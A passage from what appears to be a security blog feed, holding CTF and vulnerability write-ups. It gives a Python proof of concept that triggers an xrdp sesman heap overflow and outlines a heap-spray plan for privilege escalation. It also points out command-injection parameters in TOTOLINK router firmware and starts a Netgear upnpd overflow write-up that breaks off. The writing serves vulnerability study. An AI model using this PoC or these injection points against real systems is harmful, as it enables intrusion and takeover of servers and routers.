class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/sesman/sesman.c#L282</span></span><br><span class="line"></span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self-&gt;extra_flags == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line">        <span class="keyword">if</span> (size &gt; self-&gt;in_s-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            LOG(LOG_LEVEL_ERROR, <span class="string">&quot;sesman_data_in: bad message size&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">        self-&gt;extra_flags = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里被加了检查的 <code>size</code> 会被赋值到 <code>self-&gt;header_size</code> 中， 如果我们将 <code>size</code> 即 <code>self-&gt;header_size</code>  设置成一个<code>0x80000000</code>， </p><p>那么可能在 溢出点： <a href="https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383">https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line">            &#125;</span><br><span class="line">            read_so_far = (<span class="keyword">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);</span><br><span class="line">            to_read = self-&gt;header_size - read_so_far;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (to_read &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read); <span class="comment">// trans_tcp_recv</span></span><br></pre></td></tr></table></figure><p>造成缓冲区溢出：</p><p>因此我们尝试构造如下 PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">3350</span>))</span><br><span class="line">    sdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">0x2222CCCC</span>) <span class="comment">#version</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="number">0x80000000</span>) <span class="comment">#headersize</span></span><br><span class="line">    s.send(sdata)</span><br><span class="line">    print(sdata)</span><br><span class="line">    sdata = <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x10000</span>  </span><br><span class="line">    s.send(sdata)</span><br></pre></td></tr></table></figure><p>并在对应的地方下断点， 在调试器中可以看到：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png"></a></p><p><code>r8d</code> 为 <code>self-&gt;header_size</code> 0x80000000<code>，</code>read_so_far<code>为</code>0x9` ， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png"></a></p><p>相减完后是个负数，在拷贝的时候会发生 <code>heap overflow</code></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>出题人修改了 <code>MAX_SHORT_LIVED_CONNECTIONS</code></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/sesman/sesman.c b/sesman/sesman.c</span><br><span class="line">index a8576905..38a2f642 100644</span><br><span class="line"><span class="comment">--- a/sesman/sesman.c</span></span><br><span class="line"><span class="comment">+++ b/sesman/sesman.c</span></span><br><span class="line"><span class="meta">@@ -40,7 +40,7 @@</span></span><br><span class="line">  * At the moment, all connections to sesman are short-lived. This may change</span><br><span class="line">  * in the future</span><br><span class="line">  */</span><br><span class="line"><span class="deletion">-#define MAX_SHORT_LIVED_CONNECTIONS 16</span></span><br><span class="line"><span class="addition">+#define MAX_SHORT_LIVED_CONNECTIONS 512</span></span><br><span class="line"></span><br><span class="line"> struct sesman_startup_params</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>因此我们可以通过堆喷，覆盖结构体指针来达到控制 PC 的目的， 通过代码阅读，我们发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *</span></span><br><span class="line"><span class="class"><span class="title">trans_create</span>(<span class="title">int</span> <span class="title">mode</span>, <span class="title">int</span> <span class="title">in_size</span>, <span class="title">int</span> <span class="title">out_size</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *<span class="title">self</span> = (<span class="title">struct</span> <span class="title">trans</span> *) <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    self = (struct trans *) g_malloc(<span class="keyword">sizeof</span>(struct trans), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        make_stream(self-&gt;in_s);</span><br><span class="line">        init_stream(self-&gt;in_s, in_size);</span><br><span class="line">        make_stream(self-&gt;out_s);</span><br><span class="line">        init_stream(self-&gt;out_s, out_size);</span><br><span class="line">        self-&gt;mode = mode;</span><br><span class="line">        self-&gt;tls = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* assign tcp calls by default */</span></span><br><span class="line">        self-&gt;trans_recv = trans_tcp_recv;</span><br><span class="line">        self-&gt;trans_send = trans_tcp_send;</span><br><span class="line">        self-&gt;trans_can_recv = trans_tcp_can_recv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以通过使用 <code>trans_create</code> 函数来做堆喷。且分配出来的 <code>trans *self</code>  对象拥有函数指针，我们只需覆盖 <code>self-&gt;trans_recv</code> 就能控制 PC。另外程序没有开启 PIE， 且程序本身有 <code>g_execlp3</code> 之类的执行代码的函，题目又只要求本地提权即可，所以利用思路比较清晰。</p><ol><li>创建多个链接，进行堆喷</li><li>溢出覆盖 <code>self-&gt;trans_recv </code> 为 <code>g_execlp3</code> ， 且控制 <code>RDI</code> 为我们执行的命令 (要绝对路径)</li><li>调用 <code>self-&gt;trans_recv</code> 执行任意命令</li></ol><h2 id="totox-3"><a href="#totox-3" class="headerlink" title="totox/3"></a>totox/3</h2><p><strong>题目描述：</strong>生死竞速，本题分为三题，需要选手从三个不同路径（不同路径指从三个不同实际产生命令注入、破坏堆栈结构等内容）实现对TOTOLINK的攻击。</p><p>这其实是一个路由器题目， 主办方要求我们通过三个不同的路径攻破该路由器， 即需要使用到三个不同的漏洞。 固件版本为： X5000R_固件_V9.1.0u.6118_B20201102</p><p>通过网上查阅资料， 我们发现该款路由器拥有许多的 CVE 编号， 并且题目的这个版本是受到影响的。这里简单分析下我们用到的三个漏洞</p><h3 id="totox-1-CVE-2021-27710"><a href="#totox-1-CVE-2021-27710" class="headerlink" title="totox/1 CVE-2021-27710"></a>totox/1 CVE-2021-27710</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0044A520 aSettraceroutec:.ascii &quot;setTracerouteCfg&quot;&lt;0&gt;</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A560                 .word sub_41F6A0</span><br></pre></td></tr></table></figure><p>在cstecgi.cgi中的<code>setTracerouteCfg</code> 接口会调用 <code>sub_41F6A0</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_41F7E8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;ping %s -w %d &amp;&gt;/var/log/pingCheck&quot;</span>, Var, v4);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的 <code>ip </code> 参数可控，存在命令注入。</p><h3 id="totox-2-CVE-2021-27708"><a href="#totox-2-CVE-2021-27708" class="headerlink" title="totox/2 CVE-2021-27708"></a>totox/2 CVE-2021-27708</h3><p>在cstecgi.cgi中的函数 <code>sub_41F6A0</code> ， 即 <code>setTracerouteCfg </code> 接口有如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;traceroute -m %d %s&amp;&gt;/var/log/traceRouteLog&quot;</span>, v4, Var);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>command</code>  参数可控， 存在命令注入。</p><h3 id="totox-3-CVE-2022-27005"><a href="#totox-3-CVE-2022-27005" class="headerlink" title="totox/3 CVE-2022-27005"></a>totox/3 CVE-2022-27005</h3><p>在cstecgi.cgi中的 <code>setWanCfg</code> 接口中 ， 即 <code>sub_4212CC</code> 函数里，有如下代码片断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">strcpy</span>(v61, <span class="string">&quot;dhcp&quot;</span>);</span><br><span class="line">    v48 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;hostName&quot;</span>, &amp;byte_437F70);</span><br><span class="line">    <span class="keyword">if</span> ( *v48 )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_set(<span class="string">&quot;wan_hostname&quot;</span>, v48);</span><br><span class="line">      doSystem(<span class="string">&quot;echo  &#x27;%s&#x27;  &gt; /proc/sys/kernel/hostname&quot;</span>, v48);</span><br><span class="line">    &#125;</span><br><span class="line">    v49 = websGetVar(a1, <span class="string">&quot;dhcpMtu&quot;</span>, <span class="string">&quot;1500&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;wan_mtu&quot;</span>, v49);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>hostname</code> 可被用户控制， 存在命令注入。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">CVE-2022-23613-Patched</a></p><p><a href="https://hackmd.io/KjXzQdjDRjOuRjoZZXQo_A">CVE-2021-27710 totolink command inject</a></p><p><a href="https://hackmd.io/7FtB06f-SJ-SCfkMYcXYxA">CVE-2021-27008 totolink command inject</a></p><p><a href="https://web.archive.org/web/20220322013544/https://github.com/wudipjq/my_vuln/blob/main/totolink/vuln_30/30.md">CVE-2022-27005 totolink command inject</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-23613" scheme="https://bestwing.me/tags/CVE-2022-23613/"/>
    
    <category term="CVE-2022-27005" scheme="https://bestwing.me/tags/CVE-2022-27005/"/>
    
    <category term="CVE-2021-27710" scheme="https://bestwing.me/tags/CVE-2021-27710/"/>
    
    <category term="CVE-2021-27708" scheme="https://bestwing.me/tags/CVE-2021-27708/"/>
    
  </entry>
  
  <entry>
    <title>PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</title>
    <link href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html"/>
    <id>https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html</id>
    <published>2022-06-30T13:43:00.000Z</published>
    <updated>2022-06-30T14:54:17.986Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距离上一篇 Blog 更新已经快两个月了，想了想应该给长草的 Blog 除除草了。于是从我的笔记文档里翻了一下， 把这个漏洞翻出来给大家分享分享。具体官方通告可以参考： </p><p>【1】<a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 官方公告</a></p><p>当时我的利用是在 Netgear R6400v2 固件版本为 1.0.4.102 的环境下编写的 ，因此本篇文章也以此为基础进行讲述。</p><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p>固件下载链接: 【2】<a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 固件</a></p><p>当我们获取固件后，我们需要从中解压出文件系统 ， 这里我通过 binwalk 和 unsquashfs 成功提取出对应的固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeiMac in ~/Downloads/PSV-2020-0437 [16:43:07]</span></span><br><span class="line">$ msl --run <span class="string">&quot;binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line">[check_container() - msl:93 ] Container status: running</span><br><span class="line">[main() - msl:139 ] Running <span class="built_in">command</span>: bash -c <span class="string">&quot;cd &#x27;/workhub/Downloads/PSV-2020-0437&#x27; ; binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line"></span><br><span class="line">__________               .__  .__  _____</span><br><span class="line">\______   \__  _  ______ |  | |__|/ ____\____</span><br><span class="line"> |     ___/\ \/ \/ /    \|  | |  \   __\/ __ \</span><br><span class="line"> |    |     \     /   |  \  |_|  ||  | \  ___/</span><br><span class="line"> |____|      \/\_/|___|  /____/__||__|  \___  &gt;</span><br><span class="line">                       \/                   \/</span><br><span class="line">                                 no pwn no life</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">58            0x3A            TRX firmware header, little endian, image size: 46354432 bytes, CRC32: 0x93E72BAF, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x20BCFC, rootfs offset: 0x0</span><br><span class="line">86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5276608 bytes</span><br><span class="line">2145590       0x20BD36        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 44208035 bytes, 1807 inodes, blocksize: 131072 bytes, created: 2020-09-22 07:41:07</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:40]</span></span><br><span class="line">$ ls</span><br><span class="line">20BD36.squashfs  56.7z</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:43]</span></span><br><span class="line">$ unsquashfs 20BD36.squashfs</span><br><span class="line">Parallel unsquashfs: Using 8 processors</span><br><span class="line">1694 inodes (2629 blocks) to write</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_xattr: failed to write xattr security.selinux <span class="keyword">for</span> file squashfs-root/bin/addgroup because extended attributes are not supported by the destination filesystem</span><br><span class="line"></span><br><span class="line">Ignoring xattrs <span class="keyword">in</span> filesystem</span><br><span class="line"></span><br><span class="line">To avoid this error message, specify -no-xattrs</span><br><span class="line">[==========================================================================================================================================================================================================================| ] 2628/2629  99%</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:50] C:2</span></span><br><span class="line">$ ls squashfs-root</span><br><span class="line">bin  data  dev  etc  lib  media  mnt  opt  proc  sbin  share  sys  tmp  usr  var  www</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>众所周知 UPNP相关的程序在路由器上是经常出现漏洞的。这次也不例外， PSV-2020-0437 的漏洞也是出现在 UPNP 的相关处理代码中。我们从刚解压出来的文件系统中提取出 upnpd 程序， 然后我们用 ida pro 打开。</p><p>我们通过对 <code>recvfrom</code> 交叉引用， 找到程序的入口， 可以看该程序一开始可读入大小为 0x1fff 。 </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png"></a></p><p>然后我们跟着数据流， 即 <code>inputBuf</code>  ，我们看到程序会调用 <code>ssdp_http_method_check</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png"></a></p><p>该函数会对输入的数据进行部分解析，例如 <code>M-SEARCH</code> 、<code>ssdp:discover</code>  等关键词， 本次的漏洞是在 <code>sub_22D20</code> 函数中发生的， 我们点进去查看下这个函数。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png"></a></p><p>通过阅读上面的代码， 我们会发现该函数在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>((<span class="keyword">char</span> *)v6, (<span class="keyword">const</span> <span class="keyword">char</span> *)(MXstart + <span class="number">3</span>), end - (MXstart + <span class="number">3</span>));</span><br></pre></td></tr></table></figure><p>使用 <code>strncpy</code> 的时候，拷贝的长度计算上处理不当，会在此处产生栈溢出。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于当时手头没有 RV6400v2 的设备， 因此我采取使用 qemu-user 进行模拟的方案。 </p><p>具体几个踩坑以及解决方案如下：</p><ol><li><code>/dev/nvram: No such file or directory</code></li></ol><p>由于 netgear 使用到了 NVRAM ， 因此我们需要 hook 下 NVRAM 相关的函数， 这里我用的一个网上编译好的实现 ：【3】 <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a></p><ol start="2"><li>缺失符号</li></ol><p>找不到 dlsym 的符号。之所以会用到 dlsym，是因为该库的实现者还同时 hook 了 system、fopen、open 等函数</p><p><code>/lib/libdl.so.0</code> 导出了该符号,所以 LD_PRELOAD 的时候把这个也加上</p><ol start="3"><li>缺少一些目录以及配置信息</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat tmp/nvram.ini</span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=172.19.32.152</span><br><span class="line">hwver=R6400</span><br><span class="line">friendly_name=R6400</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><ol start="4"><li>挂载 /proc /dev 目录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br></pre></td></tr></table></figure></li></ol><p>到这我们就基本利用正常运行 upnpd 程序了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ server in /home/squashfs-root [19:32:11]</span></span><br><span class="line">$ chroot . sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2020-09-18 17:38:05 CST) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line"></span><br><span class="line"><span class="comment"># LD_PRELOAD=&quot;/custom_nvram.so /lib/libdl.so.0&quot; ./usr/sbin/upnpd</span></span><br><span class="line"><span class="comment"># [0x0002465c] fopen(&#x27;/var/run/upnpd.pid&#x27;, &#x27;wb+&#x27;) = 